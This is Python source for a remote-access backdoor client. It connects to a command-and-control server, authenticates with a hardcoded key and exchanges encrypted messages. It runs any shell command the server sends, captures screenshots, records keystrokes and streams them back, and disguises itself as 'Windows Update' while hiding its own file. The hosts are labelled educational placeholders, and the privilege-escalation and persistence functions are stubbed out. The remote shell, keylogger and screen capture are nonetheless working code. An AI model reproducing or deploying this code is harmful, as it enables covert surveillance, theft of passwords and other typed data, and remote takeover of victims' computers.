import asyncio
import json
import subprocess
import sys
import os
import ctypes
import base64
import random
import time
import socket
import logging
from cryptography.fernet import Fernet

# ================== CONFIG ==================
C2_HOSTS = [
    "127.0.0.1",                  # Educational placeholder
    "192.168.1.100"               # Educational placeholder
]
C2_PORT = 4444
KEY = b"gakvPDU9FEqe1acqhNAayt97YNkX0LMH4fSQ2s_9ah0="
AUTH_SECRET = "supersecretkey123"  # Must match server
cipher = Fernet(KEY)

RECV_TIMEOUT = 60  # seconds – longer than heartbeat interval

# Logging (to file)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("backdoor.log")]
)
logger = logging.getLogger("Backdoor")

# Global state
keylogger_running = False
keylogger_buffer = ""
keylogger_lock = asyncio.Lock()

# Response futures
pending_responses = {}  # tid -> asyncio.Future
pending_responses_lock = asyncio.Lock()

# ================== PROTOCOL LAYER ==================
def encrypt(data):
    return cipher.encrypt(data.encode())

def decrypt(data):
    try:
        return cipher.decrypt(data).decode()
    except:
        return None

async def send_json(writer, msg):
    payload = json.dumps(msg)
    encrypted = encrypt(payload)
    writer.write(len(encrypted).to_bytes(4, 'big') + encrypted)
    await writer.drain()

async def recv_json(reader):
    try:
        length_bytes = await asyncio.wait_for(reader.readexactly(4), timeout=RECV_TIMEOUT)
        length = int.from_bytes(length_bytes, 'big')
        encrypted = await asyncio.wait_for(reader.readexactly(length), timeout=RECV_TIMEOUT)
        payload = decrypt(encrypted)
        if payload is None:
            return None
        return json.loads(payload)
    except (asyncio.TimeoutError, asyncio.IncompleteReadError, json.JSONDecodeError):
        return None

# ================== SINGLE READER / DISPATCHER ==================
async def message_reader(reader, writer, command_queue):
    try:
        while True:
            msg = await recv_json(reader)
            if msg is None:
                break

            msg_type = msg.get("type")
            if msg_type == "response":
                tid = msg.get("tid")
                if tid is not None:
                    async with pending_responses_lock:
                        fut = pending_responses.get(tid)
                        if fut and not fut.done():
                            fut.set_result(msg.get("data"))
                continue

            elif msg_type == "command":
                await command_queue.put(msg)

            elif msg_type == "ping":
                await send_json(writer, {"type": "pong"})

            else:
                logger.warning(f"Unknown message type: {msg_type}")
    except Exception as e:
        logger.error(f"Message reader error: {e}")
    finally:
        await command_queue.put(None)  # signal shutdown

# ================== COMMAND PROCESSOR ==================
async def command_processor(writer, command_queue):
    while True:
        msg = await command_queue.get()
        if msg is None:
            break

        cmd = msg.get("command")
        tid = msg.get("tid")
        data = msg.get("data")

        try:
            if cmd == "exit":
                break

            elif cmd == "shell":
                if data is None:
                    result = "Shell ready"
                else:
                    result = subprocess.getoutput(data)
                await send_json(writer, {"type": "response", "tid": tid, "data": result})

            elif cmd == "screenshot":
                img = await take_screenshot()
                await send_json(writer, {"type": "screenshot", "data": f"SCREENSHOT:{img}"})

            elif cmd == "keylogger":
                global keylogger_running
                if not keylogger_running:
                    keylogger_running = True
                    asyncio.create_task(keylogger_worker(writer))
                    asyncio.create_task(send_keylogs(writer))
                    await send_json(writer, {"type": "response", "tid": tid, "data": "Keylogger started"})
                else:
                    await send_json(writer, {"type": "response", "tid": tid, "data": "Keylogger already running"})

            elif cmd == "sysinfo":
                info = f"OS: {sys.platform} | Host: {socket.gethostname()} | Admin: {ctypes.windll.shell32.IsUserAnAdmin()}"
                await send_json(writer, {"type": "response", "tid": tid, "data": info})

            elif cmd == "exec":
                result = subprocess.getoutput(data)
                await send_json(writer, {"type": "response", "tid": tid, "data": result})

            else:
                await send_json(writer, {"type": "response", "tid": tid, "data": "Unknown command"})

        except Exception as e:
            logger.error(f"Command processor error: {e}")
            await send_json(writer, {"type": "response", "tid": tid, "data": f"Error: {str(e)}"})

# ================== UTILITIES ==================
async def take_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        screenshot.save("temp.jpg", "JPEG", quality=92, optimize=True)
        with open("temp.jpg", "rb") as f:
            data = base64.b64encode(f.read()).decode()
        os.remove("temp.jpg")
        return data
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return "Screenshot failed"

async def keylogger_worker(writer):
    global keylogger_running, keylogger_buffer
    try:
        from pynput import keyboard
    except ImportError:
        logger.error("pynput not installed, keylogger disabled")
        return

    def on_press(key):
        try:
            char = key.char
            async def add_char():
                global keylogger_buffer
                async with keylogger_lock:
                    keylogger_buffer += char
                    if len(keylogger_buffer) > 300:
                        await send_json(writer, {"type": "log", "data": f"KEYLOG:{keylogger_buffer}"})
                        keylogger_buffer = ""
            asyncio.create_task(add_char())
        except AttributeError:
            async def add_special():
                global keylogger_buffer
                async with keylogger_lock:
                    keylogger_buffer += f" [{key}] "
                    if len(keylogger_buffer) > 300:
                        await send_json(writer, {"type": "log", "data": f"KEYLOG:{keylogger_buffer}"})
                        keylogger_buffer = ""
            asyncio.create_task(add_special())

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

async def send_keylogs(writer):
    global keylogger_buffer
    while keylogger_running:
        await asyncio.sleep(5)
        async with keylogger_lock:
            if keylogger_buffer:
                await send_json(writer, {"type": "log", "data": f"KEYLOG:{keylogger_buffer}"})
                keylogger_buffer = ""

# ================== CONNECTION LAYER ==================
async def connect_to_c2():
    attempt = 0
    while True:
        for host in C2_HOSTS:
            try:
                logger.info(f"Attempting connection to {host}")
                reader, writer = await asyncio.open_connection(socket.gethostbyname(host), C2_PORT)

                # Authentication
                await send_json(writer, {"type": "auth", "secret": AUTH_SECRET})
                auth_response = await recv_json(reader)
                if not auth_response or auth_response.get("type") != "auth_ok":
                    raise Exception("Authentication failed")

                logger.info(f"Connected and authenticated to {host}")
                attempt = 0  # reset backoff

                command_queue = asyncio.Queue()
                reader_task = asyncio.create_task(message_reader(reader, writer, command_queue))
                processor_task = asyncio.create_task(command_processor(writer, command_queue))

                await asyncio.wait([reader_task, processor_task], return_when=asyncio.FIRST_COMPLETED)

                reader_task.cancel()
                processor_task.cancel()
                writer.close()
                await writer.wait_closed()
                logger.info("Disconnected")

            except Exception as e:
                logger.error(f"Failed {host}: {e}")
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
                await asyncio.sleep(5)

        attempt += 1
        sleep_time = min(attempt * 15, 300)
        logger.info(f"All hosts failed. Retrying in {sleep_time}s...")
        await asyncio.sleep(sleep_time)

# ================== PERSISTENCE & STEALTH ==================
def uac_bypass():
    # Educational PoC: Active privilege escalation removed for safety.
    logger.info("UAC Bypass module disabled.")
    pass

def install_persistence():
    # Educational PoC: Active registry persistence removed for safety.
    logger.info("Persistence module disabled.")
    pass

async def main():
    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Update")
            ctypes.windll.kernel32.SetFileAttributesW(sys.argv[0], 2)
        except:
            pass

    if not ctypes.windll.shell32.IsUserAnAdmin():
        uac_bypass()

    install_persistence()

    await connect_to_c2()

if __name__ == "__main__":
    asyncio.run(main())